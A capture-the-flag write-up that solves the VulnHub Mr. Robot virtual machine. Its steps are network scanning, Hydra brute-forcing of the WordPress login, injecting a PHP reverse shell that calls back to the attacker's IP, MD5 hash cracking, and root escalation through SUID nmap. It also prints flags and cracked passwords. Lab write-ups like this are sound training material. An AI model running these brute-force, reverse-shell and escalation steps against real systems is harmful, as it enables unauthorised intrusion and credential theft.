# Exploiting the Mr. Robot VM on VulnHub

## Introduction
This write-up details the steps I took to solve the MR Robot vulnerable machine available on VulnHub. The VM is inspired by the popular TV show Mr. Robot and contains three flags, each of increasing difficulty. The main objective was to capture all three flags while demonstrating a variety of hacking techniques, including:

- Brute-force attacks
- Hash cracking
- Privilege escalation


**Threat Model:**  
In this scenario, the **threat model** assumes that the attacker is on the same local network as the Mr Robot virtual machine, allowing direct interaction with the services exposed by the target. This represents a scenario where the attacker has already gained access to the internal network.

## Enviroment Configuration
For this attack, I used the following setup and tools:

### Tools:
- **VirtualBox**: Virtualization software used to run the target VM and attacker VM.
- **Mr-Robot 1** (Relese Date: 28 Jun 2016): Target virtual machine containing the vulnerabilities.
- **Kali Linux**: Attacker virtual machine running several penetration testing tools.

  Tools already installed on Kali:
  - **Netdiscover**: Used for identifying the IP address of Mr. Robot's machine.
  - **Nmap**: Used for network scanning to identify open ports and services.
  - **Dirb**: Directory brute-forcing tool used to discover hidden files and directories on the web server.
  - **Burp Suite** (Community Edition): Used for intercepting and analyzing HTTP requests.
  - **Hydra**: Brute-forcing tool for cracking login credentials.
  - **Netcat**: Networking utility for establishing reverse shells.
  - **John the Ripper**: Password cracking tool used for MD5 hash cracking.
  - **Python**: Used to spawn an interactive shell on the compromised machine.


## Reconnaissance
### Gathering Information

The first step in attacking the target machine was to identify its IP address on the local network. I used netdiscover, a tool designed for ARP scanning, to identify live hosts within the same subnet:

```bash
netdiscover -r 192.168.227.0/24
```

This revealed that the target machine's IP address was ```192.168.227.7```. With this information, I proceeded with Nmap to identify the open ports and services running on the target:

```bash
nmap 192.168.227.7 -sV -T4 -oA nmap-scan -open
```

The scan revealed two important open ports:

- Port 80 (HTTP): Hosting a web server.
- Port 443 (HTTPS): Hosting a secure web server.

This indicated that a web service was running on the machine, so I navigated to the target's web server at ```http://192.168.227.7``` to investigate further.

DIRB
Since the target was running a web server, I decided to search for hidden directories that might reveal sensitive information using Dirb:

```bash
dirb http://192.168.227.7
```

The Dirb scan uncovered several directories, particularly ones related to WordPress, such as ```/wp-admin```, confirming that the target was running WordPress. Additionally, it revealed the existence of ```robots.txt```, which is a file typically used to prevent certain areas of the website from being indexed by search engines.

Navigating to the file ```http://192.168.227.7/robots.txt``` I discovered two important files:

- ```fsocity.dic```: A wordlist file containing a large number of words, which I later used in brute-force attacks.

- ```key-1-of-3.txt```: This file contained the first flag, marking the first step in the challenge.

By accessing these files, I was able to download the wordlist and retrieve the first key.

**Retrieving the First Key:**

By visiting ```http://192.168.227.7/key-1-of-3.txt```, I retrieved the first key: 

```
073403c8a58a1f80d943455fb30724b9
```


## Brute Force Attack
Once I discovered the WordPress login page at ```http://192.168.227.7/wp-login.php```, I needed to brute-force the login page of the WordPress installation. 

First, I used Burp Suite to capture and analyze the login requests and responses. This helped me identify the exact parameters used in the HTTP POST request and the distinct error messages for invalid usernames and passwords, which were essential for configuring Hydra.

In this phase I used the ```fsocity.dic``` wordlist, but since it contained over 800,000 entries with many duplicates, I filtered the list to create a more efficient wordlist:

```bash
sort fsocity.dic | uniq > fs-list
```

This reduced the list to about 11,000 unique entries.

#### Brute-Forcing the Username
Using Hydra, I started brute-forcing the WordPress login page to find a valid username:

```bash
hydra -L fs-list -p test 192.168.227.7 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
```

<img src="images/hydra-1.png" style="align: right" alt="nmap" width="600"/>

The attack identified ```elliot``` as a valid username. 

Next, I used Hydra again to brute-force the password for ```elliot```, using the same ```fsocity.dic``` wordlist. I modified the command to recognize the distinct error message for invalid passwords:


I ran the following command:
```bash
hydra -l elliot -P fs-list 192.168.227.7 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
```

<img src="images/hydra-2.png" style="align: right" alt="nmap" width="600"/>


This revealed ```elliot```'s password: ```ER28-0652```. With these credentials, I was able to log in to the WordPress admin panel.

## Exploitation
After successfully logging into the WordPress admin panel as ```elliot```, I moved to the Editor section, , where I was able to modify the theme files. One of the available files was ```404.php```, which handles the display of 404 error pages when non-existent pages are requested.

### Injecting a PHP Reverse Shell

I injected a PHP reverse shell into the ```404.php``` file. The reverse shell script was sourced from [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/), a trusted resource for penetration testing tools. 

<img src="images/php-404.png" style="align: right" alt="nmap" width="600"/>

Before injecting the script, I updated the ```$ip``` variable to my attacking machine's IP and set ```$port``` to 7777, which I would use to capture the reverse shell connection:

```php
$ip = '192.168.227.4';  
$port = 7777; 
```

### Establishing a Reverse Shell with Netcat
I set up a Netcat listener on my attacking machine to listen for incoming connections on port 7777:

```bash
Copia codice
nc -lnvp 7777
```

### Triggering the Reverse Shell
To trigger the reverse shell, I visited a non-existent page on the target website, such as ```http://192.168.227.7/nonexistentpage```. Since the ```404.php``` file is triggered by these types of requests, the reverse shell was executed, and I gained a shell on the target machine.

**Netcat Listener Output:** Once the reverse shell was triggered, a connection was established, and I had remote access to the target machine.

<img src="images/netcat.png" style="align: right" alt="nmap" width="600"/>

### Exploring the File System
Once I had shell access, I began exploring the file system and found two files of interest in the ```/home/robot``` directory:

- ```key-2-of-3.txt```: This file contained the second flag, but I was unable to read it due to permission restrictions.

- ```password.raw-md5```: This file contained an MD5 hashed password, which I suspected belonged to the user robot.

<img src="images/ls-to-robot.png" style="align: right" alt="nmap" width="600"/>

At this point, I needed to escalate my privileges in order to read the second flag.

## Privilege Escalation
I decided to crack the MD5 hash contained in password.raw-md5 using John the Ripper, a widely used password-cracking tool.

#### Steps to Crack the Hash:
1. First, I extracted the MD5 hash from the file ```password.raw-md5``` and saved it in a new file called hash:

```bash
echo c3fcd3d76192e4007dfb496cca67e13b > hash
```

2. Next, I used John the Ripper with the ```rockyou.txt``` wordlist to crack the MD5 hash:

```bash
Copia codice
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

John quickly cracked the MD5 hash and revealed the password in clear text: ```abcdefghijklmnopqrstuvwxyz```


<img src="images/john.png" style="align: right" alt="nmap" width="600"/>

In order to switch to the robot user, I launched an interactive shell using Python:

```bash
python -c 'import pty: pty.spawn("/bin/sh")'
```

At this point I could switch to the user ```robot``` using the cracked password:

```bash
su robot
Password: abcdefghijklmnopqrstuvwxyz
```

Once logged in as robot, I retrieved the second flag:

```bash
cat /home/robot/key-2-of-3.txt
```

<img src="images/py.png" style="align: right" alt="nmap" width="600"/>

### Root Privilege Escalation
To escalate privileges to ```root```, I searched for SUID binaries, which allow a program to be executed with elevated privileges:

```bash
find / -perm -u=s -type f 2>/dev/null
```
I discovered that Nmap had the SUID bit set. The version of Nmap installed on the machine allowed for interactive mode, which I used to gain a root shell:

```bash
nmap --interactive
```

<img src="images/nmap-interactive.png" style="align: right" alt="nmap" width="600"/>

At this point I spawned a root shell and captured the final flag:

```bash
!sh
cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```



## Conclusions
This write-up detailed my experience exploiting the MR Robot VM from VulnHub. The process involved reconnaissance, brute-force attacks, exploitation, and privilege escalation, culminating in capturing all three flags.

The demonstration was carried out independently, following walkthroughs and guides (referenced at the end of this report).

## References
- [Kali](https://www.kali.org/get-kali/#kali-platforms)
- [Mr. Robot - Vulnhub](https://www.vulnhub.com/entry/mr-robot-1,151/)
- [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/)
- [Mr. Robot - Walkthrough](https://blog.christophetd.fr/write-up-mr-robot/)
- [Mr. Robot - Walkthrough 2](https://medium.com/@cspanias/thms-mr-robot-ctf-walkthrough-2023-55ca5c19fbaf#25e2)
- [What's a robot.txt file](https://developers.google.com/search/docs/crawling-indexing/robots/robots-faq?hl=it#:~:text=No.-,Il%20file%20robots.,sottoporre%20a%20scansione%20la%20pagina)
